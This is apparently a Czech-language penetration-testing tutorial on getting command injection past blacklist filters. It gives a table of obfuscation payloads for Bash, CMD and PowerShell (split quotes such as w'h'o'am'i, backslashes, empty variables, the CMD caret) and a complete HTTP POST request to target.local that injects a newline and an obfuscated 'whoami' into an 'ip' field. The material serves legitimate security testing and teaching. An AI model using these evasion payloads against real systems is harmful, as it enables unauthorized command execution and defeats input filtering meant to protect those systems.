Obcházení filtrů zakázaných slov (**Commands Blacklist**) spoléhá na rozdíl mezi tím, jak text posuzuje naivní aplikační filtr (hledá přesnou shodu řetězce, např. `"whoami"`), a tím, jak jej interpretuje cílový shell (Bash, CMD, PowerShell).

Před samotným spuštěním příkazu shell nejprve zpracuje a odstraní řídící, uvozovací a unikovací znaky.

### 📌 Přehled technik obcházení zakázaných sloves (Command Obfuscation)

|**Technika**|**Ukázkový Payload**|**OS Kompatibilita**|**Princip fungování**|
|---|---|---|---|
|**Párové uvozovky**|`w'h'o'am'i`<br><br>  <br><br>`w"h"o"am"i`|Linux & Windows|Shell spojí jednotlivé podřetězce do jednoho slova. Počet uvozovek musí být sudý a typy se nesmí míchat.|
|**Zpětná lomítka**|`w\ho\am\i`|Linux|Zpětné lomítko `\` slouží jako escape znak. Pokud je před běžným písmenem, shell jej jednoduše ignoruje.|
|**Prázdná proměnná**|`who$@ami`<br><br>  <br><br>`who$1ami`|Linux (Bash)|Proměnná `$@` (všechny argumenty) nebo nenastavený parametr `$1` se vyhodnotí jako prázdný řetězec.|
|**Caret (Stříška)**|`who^ami`|Windows (CMD)|V prostředí `cmd.exe` funguje znak `^` jako escape znak a příkaz jej při vykonání vypustí.|

### 🛠️ Kombinovaný payload v praxi

Při skládání finálního exploit payloadu v **Burp Suite** zkoordinujeme všechny dotyčné techniky:

1. **Injekční operátor:** `%0a` (nový řádek – obchází filtr znaků `;` a `&&`).
    
2. **Zakázané sloveso:** `w'h'o'am'i` (obchází blacklist slova `whoami`).
    

HTTP

```
POST /index.php HTTP/1.1
Host: target.local
Content-Type: application/x-www-form-urlencoded

ip=127.0.0.1%0aw'h'o'am'i
```

### ⚠️ Na co si dát pozor při testování

- **Míchání uvozovek:** Zápis `w'h"o'a"mi` selže, protože shell očekává ukončení stejného typu uvozovek.
    
- **Filter znaků `\` nebo `$`:** Pokud vývojář zakázal i znaky `\` nebo `$`, zafungují pouze párové uvozovky `''` nebo kódovací techniky (např. Base64).